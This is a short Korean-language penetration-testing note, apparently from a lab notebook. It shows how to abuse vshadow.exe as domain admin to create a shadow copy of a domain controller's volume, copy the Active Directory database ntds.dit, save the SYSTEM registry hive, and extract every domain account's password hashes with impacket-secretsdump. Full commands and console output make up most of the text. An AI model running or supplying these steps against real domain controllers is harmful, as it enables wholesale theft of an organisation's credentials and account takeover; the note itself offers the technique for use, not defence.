vshadow 유틸리티를 남용하여 Active Directory Database NTDS.dit 데이터베이스 파일을 추출할 수 있는 Shadow Copies 를 만들 수 있다.

도메인 관리자로 도메인 컨트롤러에 연결한다.

**vshadow.exe**
```powershell
C:\\Tools>vshadow.exe -nw -p  C:

VSHADOW.EXE 3.0 - Volume Shadow Copy sample client.
Copyright (C) 2005 Microsoft Corporation. All rights reserved.

(Option: No-writers option detected)
(Option: Create shadow copy set)
- Setting the VSS context to: 0x00000010
Creating shadow set {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5} ...
- Adding volume \\\\?\\Volume{bac86217-0fb1-4a10-8520-482676e08191}\\ [C:\\] to the shadow set...
Creating the shadow (DoSnapshotSet) ...
(Waiting for the asynchronous operation to finish...)
Shadow copy set succesfully created.

List of created shadow copies:

Querying all shadow copies with the SnapshotSetID {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5} ...

* SNAPSHOT ID = {c37217ab-e1c4-4245-9dfe-c81078180ae5} ...
   - Shadow copy Set: {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5}
   - Original count of shadow copies = 1
   - Original Volume name: \\\\?\\Volume{bac86217-0fb1-4a10-8520-482676e08191}\\ [C:\\]
   - Creation Time: 9/19/2022 4:31:51 AM
   - Shadow copy device name: **\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2**
   - Originating machine: DC1.corp.com
   - Service machine: DC1.corp.com
   - Not Exposed
   - Provider id: {b5946137-7b9f-4925-af80-51abd60b20d5}
   - Attributes:  Auto_Release No_Writers Differential

Snapshot creation done.
```

Shadow copy device name 을 지정하고 C: 루트 경로에 AD 데이터베이스를 복사한다.
```powershell
C:\\Tools>copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\ntds\\ntds.dit c:\\ntds.dit.bak
   1 file(s) copied.
```

ntds.dit 을 올바르게 추출하려면 SYSTEM 하이브도 저장해야 한다. 이는 다음과 같이 저장가능하다.
```powershell
C:\\>reg.exe save hklm\\system c:\\system.bak
The operation completed successfully.
```

**impacket-secretsdump**
```powershell
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```